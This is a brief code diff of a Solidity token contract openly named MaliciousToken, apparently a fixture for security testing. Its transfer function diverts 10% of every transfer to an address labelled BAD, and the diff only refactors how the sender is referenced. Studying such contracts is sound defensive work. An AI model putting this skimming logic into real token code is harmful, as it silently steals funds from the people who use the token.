@@ -15,8 +15,8 @@ contract MaliciousToken is ERC20 {
   }
 
   function transfer(address recipient, uint256 amount) public override returns (bool) {
-    _transfer(super._msgSender(), BAD, (amount * 10) / 100);
-    _transfer(super._msgSender(), recipient, (amount * 90) / 100);
+    _transfer(msg.sender, BAD, (amount * 10) / 100);
+    _transfer(msg.sender, recipient, (amount * 90) / 100);
 
     return true;
   }
